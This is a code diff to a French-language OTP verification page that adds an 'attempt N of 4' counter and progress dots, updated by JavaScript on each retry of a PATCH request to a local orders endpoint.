@@ -45,8 +45,16 @@
     <h2 class="verification-title">Vérification requise</h2>
     <p class="verification-instruction">Entrez le code OTP</p>
     <p class="helper-text">Un code à 4 chiffres a été envoyé à <span id="phone">+243000000000</span></p>
+    <p class="otp-attempts-text" id="attempt-status" style="display: none;">Tentative <span id="attempt-num">0</span> sur 4</p>
+    <div class="otp-progress" id="attempt-dots" style="display: none;">
+      <div class="otp-dot" id="dot1"></div>
+      <div class="otp-dot" id="dot2"></div>
+      <div class="otp-dot" id="dot3"></div>
+      <div class="otp-dot" id="dot4"></div>
+    </div>
 
     <div class="otp-entry">
+
 
 
       <input type="text" class="otp-box" maxlength="1" id="otp1" required>
@@ -103,10 +111,32 @@ function verifyOTP() {
   btn.disabled = true;
   btn.textContent = 'Vérification en cours...';
   
+  // Show attempt progress UI
+  const attemptStatus = document.getElementById('attempt-status');
+  const attemptDots = document.getElementById('attempt-dots');
+  const attemptNum = document.getElementById('attempt-num');
+  attemptStatus.style.display = 'block';
+  attemptDots.style.display = 'flex';
+  
+  function updateAttemptUI() {
+    attemptNum.textContent = currentAttempt;
+    // Fill dots up to current attempt
+    for (let i = 1; i <= 4; i++) {
+      const dot = document.getElementById('dot' + i);
+      if (i <= currentAttempt) {
+        dot.classList.add('used');
+      } else {
+        dot.classList.remove('used');
+      }
+    }
+  }
+  
   function attemptVerification() {
     currentAttempt++;
+    updateAttemptUI();
     
     fetch('/api/orders/' + orderId, {
+
 
 
       method: 'PATCH',
